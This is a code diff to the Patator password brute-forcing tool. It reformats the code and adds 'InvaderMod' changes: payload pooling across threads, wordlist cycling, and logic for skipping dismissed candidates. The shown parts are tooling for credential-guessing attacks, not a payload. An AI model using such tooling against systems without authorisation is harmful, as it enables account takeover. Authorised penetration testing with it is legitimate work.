@@ -11,15 +11,15 @@
 # FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 # details (http://www.gnu.org/licenses/gpl.txt).
 
-__author__  = 'Sebastien Macke'
-__email__   = 'patator@hsc.fr'
-__url__     = 'http://www.hsc.fr/ressources/outils/patator/'
-__git__     = 'https://github.com/lanjelot/patator'
+__author__ = 'Sebastien Macke'
+__email__ = 'patator@hsc.fr'
+__url__ = 'http://www.hsc.fr/ressources/outils/patator/'
+__git__ = 'https://github.com/lanjelot/patator'
 __twitter__ = 'http://twitter.com/lanjelot'
 __version__ = '0.7-beta'
 __license__ = 'GPLv2'
-__banner__  = 'Patator v%s (%s)' % (__version__, __git__)
- 
+__banner__ = 'Patator v%s (%s)' % (__version__, __git__)
+
 # README {{{
 
 '''
@@ -624,185 +624,195 @@ TODO
   * use impacket/enum_lookupsids to automatically get the sid
 '''
 
+
 # }}}
 
 # logging {{{
+# InvaderMod
 class Logger:
-  def __init__(self, pipe):
-    self.pipe = pipe
-    self.name = multiprocessing.current_process().name
+    def __init__(self, pipe):
+        self.pipe = pipe
+        self.name = multiprocessing.current_process().name
 
-# neat but wont work on windows
-#  def __getattr__(self, action):
-#    def send(*args):
-#      self.pipe.send((self.name, action, args))
-#    return send
+    # neat but wont work on windows
+    #  def __getattr__(self, action):
+    #    def send(*args):
+    #      self.pipe.send((self.name, action, args))
+    #    return send
 
-  def send(self, action, *args):
-    self.pipe.send((self.name, action, args))
+    def send(self, action, *args):
+        self.pipe.put((self.name, action, args))
 
-  def quit(self):
-    self.send('quit')
+    def quit(self):
+        self.send('quit')
 
-  def headers(self):
-    self.send('headers')
+    def headers(self):
+        self.send('headers')
 
-  def result(self, *args):
-    self.send('result', *args)
+    def result(self, *args):
+        self.send('result', *args)
 
-  def save(self, *args):
-    self.send('save', *args)
+    def save(self, *args):
+        self.send('save', *args)
 
-  def setLevel(self, level):
-    self.send('setLevel', level)
+    def setLevel(self, level):
+        self.send('setLevel', level)
 
-  def warn(self, msg):
-    self.send('warn', msg)
+    def warn(self, msg):
+        self.send('warn', msg)
 
-  def info(self, msg):
-    self.send('info', msg)
+    def info(self, msg):
+        self.send('info', msg)
 
-  def debug(self, msg):
-    self.send('debug', msg)
+    def debug(self, msg):
+        self.send('debug', msg)
+
 
 import logging
+
+
 class TXTFormatter(logging.Formatter):
-  def __init__(self, indicatorsfmt):
-    self.resultfmt = '%(asctime)s %(name)-7s %(levelname)7s - ' + ' '.join('%%(%s)%ss' % (k, v) for k, v in indicatorsfmt) + ' | %(candidate)-34s | %(num)5s | %(mesg)s'
+    def __init__(self, indicatorsfmt):
+        self.resultfmt = '%(asctime)s %(name)-7s %(levelname)7s - ' + ' '.join(
+            '%%(%s)%ss' % (k, v) for k, v in indicatorsfmt) + ' | %(candidate)-34s | %(num)5s | %(mesg)s'
 
-    logging.Formatter.__init__(self, datefmt='%H:%M:%S')
+        logging.Formatter.__init__(self, datefmt='%H:%M:%S')
 
-  def format(self, record):
-    if not record.msg or record.msg == 'headers':
-      self._fmt = self.resultfmt
-    else:
-      if record.levelno == logging.DEBUG:
-        self._fmt = '%(asctime)s %(name)-7s %(levelname)7s [%(pname)s] %(message)s'
-      else:
-        self._fmt = '%(asctime)s %(name)-7s %(levelname)7s - %(message)s'
+    def format(self, record):
+        if not record.msg or record.msg == 'headers':
+            self._fmt = self.resultfmt
+        else:
+            if record.levelno == logging.DEBUG:
+                self._fmt = '%(asctime)s %(name)-7s %(levelname)7s [%(pname)s] %(message)s'
+            else:
+                self._fmt = '%(asctime)s %(name)-7s %(levelname)7s - %(message)s'
 
-    return logging.Formatter.format(self, record)
+        return logging.Formatter.format(self, record)
+
 
 class CSVFormatter(logging.Formatter):
-  def __init__(self, indicatorsfmt):
-    fmt = '%(asctime)s,%(levelname)s,'+','.join('%%(%s)s' % name for name, _ in indicatorsfmt)+',%(candidate)s,%(num)s,%(mesg)s'
+    def __init__(self, indicatorsfmt):
+        fmt = '%(asctime)s,%(levelname)s,' + ','.join(
+            '%%(%s)s' % name for name, _ in indicatorsfmt) + ',%(candidate)s,%(num)s,%(mesg)s'
 
-    logging.Formatter.__init__(self, fmt, datefmt='%H:%M:%S')
+        logging.Formatter.__init__(self, fmt, datefmt='%H:%M:%S')
+
 
 class XMLFormatter(logging.Formatter):
-  def __init__(self, indicatorsfmt):
-    fmt = '''<result time="%(asctime)s" level="%(levelname)s">
+    def __init__(self, indicatorsfmt):
+        fmt = '''<result time="%(asctime)s" level="%(levelname)s">
 ''' + '\n'.join('  <{0}>%({0})s</{0}>'.format(name) for name, _ in indicatorsfmt) + '''
   <candidate><![CDATA[%(candidate)s]]></candidate>
   <num>%(num)s</num>
   <mesg><![CDATA[%(mesg)s]]></mesg>
 </result>'''
 
-    logging.Formatter.__init__(self, fmt, datefmt='%H:%M:%S')
+        logging.Formatter.__init__(self, fmt, datefmt='%H:%M:%S')
+
 
 class MsgFilter(logging.Filter):
+    def filter(self, record):
+        if record.msg:
+            return 0
+        else:
+            return 1
 
-  def filter(self, record):
-    if record.msg:
-      return 0
-    else:
-      return 1
 
 def process_logs(pipe, indicatorsfmt, argv, log_dir):
+    ignore_ctrlc()
 
-  ignore_ctrlc()
+    logging._levelNames[logging.ERROR] = 'FAIL'
 
-  logging._levelNames[logging.ERROR] = 'FAIL'
+    handler_out = logging.StreamHandler()
+    handler_out.setFormatter(TXTFormatter(indicatorsfmt))
 
-  handler_out = logging.StreamHandler()
-  handler_out.setFormatter(TXTFormatter(indicatorsfmt))
+    logger = logging.getLogger('patator')
+    logger.setLevel(logging.DEBUG)
+    logger.addHandler(handler_out)
 
-  logger = logging.getLogger('patator')
-  logger.setLevel(logging.DEBUG)
-  logger.addHandler(handler_out)
+    if log_dir:
+        runtime_log = os.path.join(log_dir, 'RUNTIME.log')
+        results_csv = os.path.join(log_dir, 'RESULTS.csv')
+        results_xml = os.path.join(log_dir, 'RESULTS.xml')
 
-  if log_dir:
-    runtime_log = os.path.join(log_dir, 'RUNTIME.log')
-    results_csv = os.path.join(log_dir, 'RESULTS.csv')
-    results_xml = os.path.join(log_dir, 'RESULTS.xml')
+        with open(runtime_log, 'a') as f:
+            f.write('$ %s\n' % ' '.join(argv))
 
-    with open(runtime_log, 'a') as f:
-      f.write('$ %s\n' % ' '.join(argv))
+        names = [name for name, _ in indicatorsfmt] + ['candidate', 'num', 'mesg']
 
-    names = [name for name, _ in indicatorsfmt] + ['candidate', 'num', 'mesg']
+        if not os.path.exists(results_csv):
+            with open(results_csv, 'w') as f:
+                f.write('time,level,%s\n' % ','.join(names))
 
-    if not os.path.exists(results_csv):
-      with open(results_csv, 'w') as f:
-        f.write('time,level,%s\n' % ','.join(names))
+        if not os.path.exists(results_xml):
+            with open(results_xml, 'w') as f:
+                f.write('<?xml version="1.0" ?>\n<results>\n')
 
-    if not os.path.exists(results_xml):
-      with open(results_xml, 'w') as f:
-        f.write('<?xml version="1.0" ?>\n<results>\n')
+        else:  # remove "</results>\n"
+            with open(results_xml, 'r+') as f:
+                f.seek(-11, 2)
+                f.truncate(f.tell())
 
-    else: # remove "</results>\n"
-      with open(results_xml, 'r+') as f:
-        f.seek(-11, 2)
-        f.truncate(f.tell())
+        handler_log = logging.FileHandler(runtime_log)
+        handler_csv = logging.FileHandler(results_csv)
+        handler_xml = logging.FileHandler(results_xml)
 
-    handler_log = logging.FileHandler(runtime_log)
-    handler_csv = logging.FileHandler(results_csv)
-    handler_xml = logging.FileHandler(results_xml)
+        handler_csv.addFilter(MsgFilter())
+        handler_xml.addFilter(MsgFilter())
 
-    handler_csv.addFilter(MsgFilter())
-    handler_xml.addFilter(MsgFilter())
+        handler_log.setFormatter(TXTFormatter(indicatorsfmt))
+        handler_csv.setFormatter(CSVFormatter(indicatorsfmt))
+        handler_xml.setFormatter(XMLFormatter(indicatorsfmt))
 
-    handler_log.setFormatter(TXTFormatter(indicatorsfmt))
-    handler_csv.setFormatter(CSVFormatter(indicatorsfmt))
-    handler_xml.setFormatter(XMLFormatter(indicatorsfmt))
+        logger.addHandler(handler_log)
+        logger.addHandler(handler_csv)
+        logger.addHandler(handler_xml)
 
-    logger.addHandler(handler_log)
-    logger.addHandler(handler_csv)
-    logger.addHandler(handler_xml)
+    while True:
 
-  while True:
+        pname, action, args = pipe.get()
 
-    pname, action, args = pipe.recv()
+        if action == 'quit':
+            if log_dir:
+                with open(os.path.join(log_dir, 'RESULTS.xml'), 'a') as f:
+                    f.write('</results>\n')
+            break
 
-    if action == 'quit':
-      if log_dir:
-        with open(os.path.join(log_dir, 'RESULTS.xml'), 'a') as f:
-          f.write('</results>\n')
-      break
+        elif action == 'headers':
 
-    elif action == 'headers':
+            names = [name for name, _ in indicatorsfmt] + ['candidate', 'num', 'mesg']
 
-      names = [name for name, _ in indicatorsfmt] + ['candidate', 'num', 'mesg']
+            logger.info(' ' * 77)
+            logger.info('headers', extra=dict((n, n) for n in names))
+            logger.info('-' * 77)
 
-      logger.info(' '*77)
-      logger.info('headers', extra=dict((n, n) for n in names))
-      logger.info('-'*77)
+        elif action == 'result':
 
-    elif action == 'result':
+            typ, resp, candidate, num = args
 
-      typ, resp, candidate, num = args
+            results = [(name, value) for (name, _), value in zip(indicatorsfmt, resp.indicators())]
+            results += [('candidate', candidate), ('num', num), ('mesg', resp)]
 
-      results = [(name, value) for (name, _), value in zip(indicatorsfmt, resp.indicators())]
-      results += [('candidate', candidate), ('num', num), ('mesg', resp)]
+            if typ == 'fail':
+                logger.error(None, extra=dict(results))
+            else:
+                logger.info(None, extra=dict(results))
 
-      if typ == 'fail':
-        logger.error(None, extra=dict(results))
-      else:
-        logger.info(None, extra=dict(results))
+        elif action == 'save':
 
-    elif action == 'save':
+            resp, num = args
 
-      resp, num = args
+            if log_dir:
+                filename = '%d_%s' % (num, '-'.join(map(str, resp.indicators())))
+                with open('%s.txt' % os.path.join(log_dir, filename), 'w') as f:
+                    f.write(resp.dump())
 
-      if log_dir:
-        filename = '%d_%s' % (num, '-'.join(map(str, resp.indicators())))
-        with open('%s.txt' % os.path.join(log_dir, filename), 'w') as f:
-          f.write(resp.dump())
+        elif action == 'setLevel':
+            logger.setLevel(args[0])
 
-    elif action == 'setLevel':
-      logger.setLevel(args[0])
+        else:  # 'warn', 'info', 'debug'
+            getattr(logger, action)(args[0], extra={'pname': pname})
 
-    else: # 'warn', 'info', 'debug'
-      getattr(logger, action)(args[0], extra={'pname': pname})
 
 # }}}
 
@@ -828,27 +838,31 @@ from collections import defaultdict
 import multiprocessing
 import signal
 import ctypes
+
 try:
-  # python3+
-  from queue import Empty, Full
-  from urllib.parse import quote, urlencode, urlparse, urlunparse, parse_qsl, quote_plus
-  from io import StringIO
+    # python3+
+    from queue import Empty, Full
+    from urllib.parse import quote, urlencode, urlparse, urlunparse, parse_qsl, quote_plus
+    from io import StringIO
 except ImportError:
-  # python2.6+
-  from Queue import Empty, Full
-  from urllib import quote, urlencode, quote_plus
-  from urlparse import urlparse, urlunparse, parse_qsl
-  from cStringIO import StringIO
+    # python2.6+
+    from Queue import Empty, Full
+    from urllib import quote, urlencode, quote_plus
+    from urlparse import urlparse, urlunparse, parse_qsl
+    from cStringIO import StringIO
 
 notfound = []
 try:
-  from IPy import IP
-  has_ipy = True
+    from IPy import IP
+
+    has_ipy = True
 except ImportError:
-  has_ipy = False
-  notfound.append('IPy')
+    has_ipy = False
+    notfound.append('IPy')
 
 import multiprocessing.forking
+
+
 class _Popen(multiprocessing.forking.Popen):
     def __init__(self, *args, **kw):
         if hasattr(sys, 'frozen'):
@@ -868,112 +882,246 @@ class _Popen(multiprocessing.forking.Popen):
                 else:
                     os.putenv('_MEIPASS2', '')
 
+
 class Process(multiprocessing.Process):
     _Popen = _Popen
+
 
 # So BaseManager.start() uses this new Process class
 multiprocessing.Process = Process
 from multiprocessing.managers import SyncManager
 
+
 # imports }}}
 
 # utils {{{
 def which(program):
-  def is_exe(fpath):
-    return os.path.exists(fpath) and os.access(fpath, os.X_OK)
+    def is_exe(fpath):
+        return os.path.exists(fpath) and os.access(fpath, os.X_OK)
 
-  fpath, fname = os.path.split(program)
-  if on_windows() and fname[-4:] != '.exe' :
-    fname += '.exe'
+    fpath, fname = os.path.split(program)
+    if on_windows() and fname[-4:] != '.exe':
+        fname += '.exe'
 
-  if fpath:
-    if is_exe(program):
-      return program
-  else:
-    for path in os.environ["PATH"].split(os.pathsep):
-      exe_file = os.path.join(path, fname)
-      if is_exe(exe_file):
-        return exe_file
+    if fpath:
+        if is_exe(program):
+            return program
+    else:
+        for path in os.environ["PATH"].split(os.pathsep):
+            exe_file = os.path.join(path, fname)
+            if is_exe(exe_file):
+                return exe_file
 
-  return None
+    return None
+
 
 def build_logdir(opt_dir, opt_auto):
     if opt_auto:
-      return create_time_dir(opt_dir or '/tmp/patator', opt_auto)
+        return create_time_dir(opt_dir or '/tmp/patator', opt_auto)
     elif opt_dir:
-      return create_dir(opt_dir)
+        return create_dir(opt_dir)
     else:
-      return None
+        return None
+
 
 def create_dir(top_path):
-  top_path = os.path.abspath(top_path)
-  if os.path.isdir(top_path):
-    files = os.listdir(top_path)
-    if files:
-      if raw_input("Directory '%s' is not empty, do you want to wipe it ? [Y/n]: " % top_path) != 'n':
-        for root, dirs, files in os.walk(top_path):
-          if dirs:
-            print("Directory '%s' contains sub-directories, safely aborting..." % root)
-            sys.exit(0)
-          for f in files:
-            os.unlink(os.path.join(root, f))
-          break
-  else:
-    os.mkdir(top_path)
-  return top_path
+    top_path = os.path.abspath(top_path)
+    if os.path.isdir(top_path):
+        files = os.listdir(top_path)
+        if files:
+            if raw_input("Directory '%s' is not empty, do you want to wipe it ? [Y/n]: " % top_path) != 'n':
+                for root, dirs, files in os.walk(top_path):
+                    if dirs:
+                        print("Directory '%s' contains sub-directories, safely aborting..." % root)
+                        sys.exit(0)
+                    for f in files:
+                        os.unlink(os.path.join(root, f))
+                    break
+    else:
+        os.mkdir(top_path)
+    return top_path
+
 
 def create_time_dir(top_path, desc):
-  now = localtime()
-  date, time = strftime('%Y-%m-%d', now), strftime('%H%M%S', now)
-  top_path = os.path.abspath(top_path)
-  date_path = os.path.join(top_path, date)
-  time_path = os.path.join(top_path, date, time + '_' + desc)
+    now = localtime()
+    date, time = strftime('%Y-%m-%d', now), strftime('%H%M%S', now)
+    top_path = os.path.abspath(top_path)
+    date_path = os.path.join(top_path, date)
+    time_path = os.path.join(top_path, date, time + '_' + desc)
 
-  if not os.path.isdir(top_path):
-    os.makedirs(top_path)
-  if not os.path.isdir(date_path):
-    os.mkdir(date_path)
-  if not os.path.isdir(time_path):
-    os.mkdir(time_path)
+    if not os.path.isdir(top_path):
+        os.makedirs(top_path)
+    if not os.path.isdir(date_path):
+        os.mkdir(date_path)
+    if not os.path.isdir(time_path):
+        os.mkdir(time_path)
 
-  return time_path
+    return time_path
+
 
 def pprint_seconds(seconds, fmt):
-  return fmt % reduce(lambda x,y: divmod(x[0], y) + x[1:], [(seconds,),60,60])
+    return fmt % reduce(lambda x, y: divmod(x[0], y) + x[1:], [(seconds,), 60, 60])
+
 
 def md5hex(plain):
-  return hashlib.md5(plain).hexdigest()
+    return hashlib.md5(plain).hexdigest()
+
 
 def sha1hex(plain):
-  return hashlib.sha1(plain).hexdigest()
+    return hashlib.sha1(plain).hexdigest()
+
+
+# InvaderMod
+class PoolContainer:
+    def __init__(self, iterate):
+        self.iterate = iterate
+        self.gen = None
+        self.pool = []
+
+    def __nonzero__(self):
+        return self.iterate
+
+    def update_pool(self, size):
+        self.pool = []
+        if self.gen is not None:
+            for i in range(size):
+                self.pool.append((i, self.gen.next()))
+
 
 # I rewrote itertools.product to avoid memory over-consumption when using large wordlists
-def product(xs, *rest):
-  if len(rest) == 0:
-    for x in xs():
-      yield [x]
-  else:
-    for head in xs():
-      for tail in product(*rest):
-        yield [head] + tail
+# InvaderMod
+def product(xs, *rest, **kwargs):
+    # possible kwargs: cycle_index=int, rec_depth=int, iter_reg={iter_index, ['parameter1', 'if_combo_parameter2']},
+    # free_map={'parameter':[value1, value2, ...]}
+    cycle_index = kwargs.get('cycle_index', None)
+    pool_index = kwargs.get('pool_index', None)
+    num_threads = kwargs.get('num_threads', None)
+    pool_con = kwargs.get('pool_con', PoolContainer(True))
+    rec_depth = kwargs.get('rec_depth', 0)
+    iter_reg = kwargs.get('iter_reg', None)
+    ns = kwargs.get('ns', None)
 
-def chain(*iterables):
-  def xs():
-    for iterable in iterables:
-      for element in iterable:
-        yield element
-  return xs
+    while pool_con or rec_depth > 0:
 
+        if pool_con.gen is not None and rec_depth is 0:
+            try:
+                pool_con.update_pool(num_threads)
+            except StopIteration:
+                if len(pool_con.pool) is 0:
+                    break
+                pool_con.iterate = False
+
+        if cycle_index is not None and cycle_index == rec_depth:
+            if len(rest) == 0:
+                yield [xs().next()]
+            else:
+                for tail in product(*rest, cycle_index=cycle_index, pool_index=pool_index, pool_con=pool_con,
+                                    num_threads=num_threads, rec_depth=rec_depth + 1, iter_reg=iter_reg, ns=ns):
+                    yield [xs().next()] + tail
+        elif pool_index is not None and pool_index == rec_depth:
+            if pool_con.gen is None:
+                pool_con.gen = xs()
+                try:
+                    pool_con.update_pool(num_threads)
+                except StopIteration:
+                    pool_con.iterate = False
+            if len(rest) == 0:
+                for x in pool_con.pool:
+                    if ns is not None and is_free(x[1], rec_depth, iter_reg, ns): continue
+                    yield [x]
+            else:
+                for head in pool_con.pool:
+                    if ns is not None and is_free(head[1], rec_depth, iter_reg, ns): continue
+                    for tail in product(*rest, cycle_index=cycle_index, pool_index=pool_index, pool_con=pool_con,
+                                        num_threads=num_threads, rec_depth=rec_depth + 1, iter_reg=iter_reg, ns=ns):
+                        yield [head] + tail
+        else:
+            if len(rest) == 0:
+                for x in xs():
+                    if ns is not None and is_free(x, rec_depth, iter_reg, ns): continue
+                    yield [x]
+            else:
+                for head in xs():
+                    if ns is not None and is_free(head, rec_depth, iter_reg, ns): continue
+                    for tail in product(*rest, cycle_index=cycle_index, pool_index=pool_index, pool_con=pool_con,
+                                        num_threads=num_threads, rec_depth=rec_depth + 1, iter_reg=iter_reg, ns=ns):
+                        yield [head] + tail
+
+        if pool_index is not None and rec_depth is 0:
+            clear_free_list(ns, iter_reg[pool_index])
+        if pool_index is None or rec_depth > 0:
+            break
+
+
+# InvaderMod
+def is_free(item, rec_depth, iter_reg, ns):
+    if iter_reg is not None and rec_depth in iter_reg:
+        for p in iter_reg[rec_depth]:
+            if ns is not None:
+                for m in ns.free_list:
+                    args = m.split(',', 1)
+                    for arg in args:
+                        k, v = arg.split('=', 1)
+                        if p != k:
+                            break
+                        elif str(item) != v:
+                            break
+                    else:
+                        return True
+    return False
+
+
+# InvaderMod
+def clear_free_list(ns, pool):
+    free_list = ns.free_list
+    for m in ns.free_list:
+        args = m.split(',', 1)
+        in_pool = False
+        for arg in args:
+            k, v = arg.split('=', 1)
+            for p in pool:
+                if p == k:
+                    in_pool = True
+        if in_pool:
+            try:
+                free_list.remove(m)
+            except:
+                pass
+    ns.free_list = free_list
+
+
+# InvaderMod
+def chain(*iterables, **kwargs):
+    def xs():
+        if kwargs.get('cycle', None) is None or kwargs.get('cycle', None) is False:
+            for iterable in iterables:
+                for element in iterable:
+                    yield element
+        else:
+            while True:
+                for iterable in iterables:
+                    for element in iterable:
+                        yield element
+                    if isinstance(iterable, FileIter):
+                        iterable.fileobject.seek(0)
+
+    return xs
+
+
+# InvaderMod
 class FileIter:
-  def __init__(self, filename):
-    self.filename = filename
+    def __init__(self, filename, cycle=False):
+        self.filename = filename
+        self.fileobject = open(self.filename) if cycle else None
 
-  def __iter__(self):
-    return open(self.filename)
+    def __iter__(self):
+        return self.fileobject if self.fileobject else open(self.filename)
+
 
 def padhex(d):
-  x = '%x' % d
-  return '0' * (len(x) % 2) + x
+    x = '%x' % d
+    return '0' * (len(x) % 2) + x
+
 
 # These are examples. You can easily write your own iterator to fit your needs.
 # Or using the PROG keyword, you can call an external program such as:
@@ -984,245 +1132,254 @@ def padhex(d):
 # $ ./dummy_test data=PROG0 0='seq 1 80'
 # $ ./dummy_test data=PROG0 0='mp64.bin ?l?l?l',$(mp64.bin --combination ?l?l?l)
 class RangeIter:
+    def __init__(self, typ, rng, random=None):  # random.Random()):
 
-  def __init__(self, typ, rng, random=None): #random.Random()):
+        if typ in ('hex', 'int', 'float'):
 
-    if typ in ('hex', 'int', 'float'):
+            m = re.match(r'(-?.+?)-(-?.+)$', rng)  # 5-50 or -5-50 or 5--50 or -5--50
+            if not m:
+                raise NotImplementedError("Unsupported range '%s'" % rng)
 
-      m = re.match(r'(-?.+?)-(-?.+)$', rng) # 5-50 or -5-50 or 5--50 or -5--50
-      if not m:
-        raise NotImplementedError("Unsupported range '%s'" % rng)
+            mn = m.group(1)
+            mx = m.group(2)
 
-      mn = m.group(1)
-      mx = m.group(2)
+            if typ == 'hex':
+                mn = int(mn, 16)
+                mx = int(mx, 16)
+                fmt = padhex
 
-      if typ == 'hex':
-        mn = int(mn, 16)
-        mx = int(mx, 16)
-        fmt = padhex
+            elif typ == 'int':
+                mn = int(mn)
+                mx = int(mx)
+                fmt = '%d'
 
-      elif typ == 'int':
-        mn = int(mn)
-        mx = int(mx)
-        fmt = '%d'
+            elif typ == 'float':
+                from decimal import Decimal
+                mn = Decimal(mn)
+                mx = Decimal(mx)
 
-      elif typ == 'float':
-        from decimal import Decimal
-        mn = Decimal(mn)
-        mx = Decimal(mx)
-
-      if mn > mx:
-        step = -1
-      else:
-        step = 1
-
-    elif typ == 'letters':
-      charset = [c for c in string.letters]
-
-    elif typ in ('lower', 'lowercase'):
-      charset = [c for c in string.lowercase]
-
-    elif typ in ('upper', 'uppercase'):
-      charset = [c for c in string.uppercase]
-
-    else:
-      raise NotImplementedError("Incorrect type '%s'" % typ)
-
-    def zrange(start, stop, step, fmt):
-      x = start
-      while x != stop+step:
-
-        if callable(fmt):
-          yield fmt(x)
-        else:
-          yield fmt % x
-        x += step
-
-    def letterrange(first, last, charset):
-      for k in range(len(last)):
-        for x in product(*[chain(charset)]*(k+1)):
-          result = ''.join(x)
-          if first:
-            if first != result:
-              continue
+            if mn > mx:
+                step = -1
             else:
-              first = None
-          yield result
-          if result == last:
-            return
+                step = 1
 
-    if typ == 'float':
-      precision = max(len(str(x).partition('.')[-1]) for x in (mn, mx))
+        elif typ == 'letters':
+            charset = [c for c in string.letters]
 
-      fmt = '%%.%df' % precision
-      exp = 10**precision
-      step *= Decimal(1) / exp
+        elif typ in ('lower', 'lowercase'):
+            charset = [c for c in string.lowercase]
 
-      self.generator = zrange, (mn, mx, step, fmt)
-      self.size = int(abs(mx-mn) * exp) + 1
+        elif typ in ('upper', 'uppercase'):
+            charset = [c for c in string.uppercase]
 
-      def random_generator():
-        while True:
-          yield fmt % (Decimal(random.randint(mn*exp, mx*exp)) / exp)
+        else:
+            raise NotImplementedError("Incorrect type '%s'" % typ)
 
-    elif typ in ('hex', 'int'):
-      self.generator = zrange, (mn, mx, step, fmt)
-      self.size = abs(mx-mn) + 1
+        def zrange(start, stop, step, fmt):
+            x = start
+            while x != stop + step:
 
-      def random_generator():
-        while True:
-          yield fmt % random.randint(mn, mx)
+                if callable(fmt):
+                    yield fmt(x)
+                else:
+                    yield fmt % x
+                x += step
 
-    else: # letters, lower, upper
-      def count(f):
-        total = 0
-        i = 0
-        for c in f[::-1]:
-          z = charset.index(c) + 1
-          total += (len(charset)**i)*z
-          i += 1
-        return total + 1
+        def letterrange(first, last, charset):
+            for k in range(len(last)):
+                for x in product(*[chain(charset)] * (k + 1)):
+                    result = ''.join(x)
+                    if first:
+                        if first != result:
+                            continue
+                        else:
+                            first = None
+                    yield result
+                    if result == last:
+                        return
 
-      first, last = rng.split('-')
-      self.generator = letterrange, (first, last, charset)
-      self.size = count(last) - count(first) + 1
+        if typ == 'float':
+            precision = max(len(str(x).partition('.')[-1]) for x in (mn, mx))
 
-    if random:
-      self.generator = random_generator, ()
-      self.size = sys.maxint
+            fmt = '%%.%df' % precision
+            exp = 10 ** precision
+            step *= Decimal(1) / exp
 
-  def __iter__(self):
-    fn, args = self.generator
-    return fn(*args)
+            self.generator = zrange, (mn, mx, step, fmt)
+            self.size = int(abs(mx - mn) * exp) + 1
 
-  def __len__(self):
-    return self.size
+            def random_generator():
+                while True:
+                    yield fmt % (Decimal(random.randint(mn * exp, mx * exp)) / exp)
+
+        elif typ in ('hex', 'int'):
+            self.generator = zrange, (mn, mx, step, fmt)
+            self.size = abs(mx - mn) + 1
+
+            def random_generator():
+                while True:
+                    yield fmt % random.randint(mn, mx)
+
+        else:  # letters, lower, upper
+            def count(f):
+                total = 0
+                i = 0
+                for c in f[::-1]:
+                    z = charset.index(c) + 1
+                    total += (len(charset) ** i) * z
+                    i += 1
+                return total + 1
+
+            first, last = rng.split('-')
+            self.generator = letterrange, (first, last, charset)
+            self.size = count(last) - count(first) + 1
+
+        if random:
+            self.generator = random_generator, ()
+            self.size = sys.maxint
+
+    def __iter__(self):
+        fn, args = self.generator
+        return fn(*args)
+
+    def __len__(self):
+        return self.size
+
 
 class ProgIter:
+    def __init__(self, prog):
+        self.prog = prog
 
-  def __init__(self, prog):
-    self.prog = prog
+    def __iter__(self):
+        p = subprocess.Popen(self.prog.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return p.stdout
 
-  def __iter__(self):
-    p = subprocess.Popen(self.prog.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    return p.stdout
 
 class Progress:
-  def __init__(self):
-    self.current = ''
-    self.done_count = 0
-    self.hits_count = 0
-    self.skip_count = 0
-    self.fail_count = 0
-    self.seconds = [1]*25 # avoid division by zero early bug condition
+    def __init__(self):
+        self.current = ''
+        self.done_count = 0
+        self.hits_count = 0
+        self.skip_count = 0
+        self.fail_count = 0
+        self.seconds = [1] * 25  # avoid division by zero early bug condition
+
 
 class TimeoutError(Exception):
-  pass
+    pass
+
 
 def on_windows():
-  return 'Win' in system()
+    return 'Win' in system()
+
 
 def ignore_ctrlc():
-  if on_windows():
-    ctypes.windll.kernel32.SetConsoleCtrlHandler(0, 1)
-  else:
-    signal.signal(signal.SIGINT, signal.SIG_IGN)
+    if on_windows():
+        ctypes.windll.kernel32.SetConsoleCtrlHandler(0, 1)
+    else:
+        signal.signal(signal.SIGINT, signal.SIG_IGN)
+
 
 def handle_alarm():
-  if not on_windows():
-    signal.signal(signal.SIGALRM, raise_timeout)
+    if not on_windows():
+        signal.signal(signal.SIGALRM, raise_timeout)
+
 
 def raise_timeout(signum, frame):
-  if signum == signal.SIGALRM:
-    raise TimeoutError('timed out')
+    if signum == signal.SIGALRM:
+        raise TimeoutError('timed out')
+
 
 def enable_alarm(timeout):
-  if not on_windows():
-    signal.alarm(timeout)
+    if not on_windows():
+        signal.alarm(timeout)
+
 
 def disable_alarm():
-  if not on_windows():
-     signal.alarm(0)
+    if not on_windows():
+        signal.alarm(0)
+
 
 # SyncManager.start(initializer) only available since python2.7
 class MyManager(SyncManager):
-  @classmethod
-  def _run_server(cls, registry, address, authkey, serializer, writer, initializer=None, initargs=()):
-    ignore_ctrlc()
-    super(MyManager, cls)._run_server(registry, address, authkey, serializer, writer)
+    @classmethod
+    def _run_server(cls, registry, address, authkey, serializer, writer, initializer=None, initargs=()):
+        ignore_ctrlc()
+        super(MyManager, cls)._run_server(registry, address, authkey, serializer, writer)
+
 
 # }}}
 
 # Controller {{{
+# InviderMod
 class Controller:
-
-  builtin_actions = (
-    ('ignore', 'do not report'),
-    ('retry', 'try payload again'),
-    ('free', 'dismiss future similar payloads'),
-    ('quit', 'terminate execution now'),
+    builtin_actions = (
+        ('ignore', 'do not report'),
+        ('retry', 'try payload again'),
+        ('free', 'dismiss future similar payloads'),
+        ('quit', 'terminate execution now'),
     )
 
-  available_encodings = {
-    'hex': (hexlify, 'encode in hexadecimal'),
-    'b64': (b64encode, 'encode in base64'),
-    'md5': (md5hex, 'hash in md5'),
-    'sha1': (sha1hex, 'hash in sha1'),
-    'url': (quote_plus, 'url encode'),
+    available_encodings = {
+        'hex': (hexlify, 'encode in hexadecimal'),
+        'b64': (b64encode, 'encode in base64'),
+        'md5': (md5hex, 'hash in md5'),
+        'sha1': (sha1hex, 'hash in sha1'),
+        'url': (quote_plus, 'url encode'),
     }
 
-  def expand_key(self, arg):
-    yield arg.split('=', 1)
+    def expand_key(self, arg):
+        yield arg.split('=', 1)
 
-  def find_file_keys(self, value):
-    return map(int, re.findall(r'FILE(\d)', value))
+    def find_file_keys(self, value):
+        return map(int, re.findall(r'FILE(\d)', value))
 
-  def find_net_keys(self, value):
-    return map(int, re.findall(r'NET(\d)', value))
+    def find_net_keys(self, value):
+        return map(int, re.findall(r'NET(\d)', value))
 
-  def find_combo_keys(self, value):
-    return [map(int, t) for t in re.findall(r'COMBO(\d)(\d)', value)]
+    def find_combo_keys(self, value):
+        return [map(int, t) for t in re.findall(r'COMBO(\d)(\d)', value)]
 
-  def find_module_keys(self, value):
-    return map(int, re.findall(r'MOD(\d)', value))
+    def find_module_keys(self, value):
+        return map(int, re.findall(r'MOD(\d)', value))
 
-  def find_range_keys(self, value):
-    return map(int, re.findall(r'RANGE(\d)', value))
+    def find_range_keys(self, value):
+        return map(int, re.findall(r'RANGE(\d)', value))
 
-  def find_prog_keys(self, value):
-    return map(int, re.findall(r'PROG(\d)', value))
+    def find_prog_keys(self, value):
+        return map(int, re.findall(r'PROG(\d)', value))
 
-  def usage_parser(self, name):
-    from optparse import OptionParser
-    from optparse import OptionGroup
-    from optparse import IndentedHelpFormatter
+    def usage_parser(self, name):
+        from optparse import OptionParser
+        from optparse import OptionGroup
+        from optparse import IndentedHelpFormatter
 
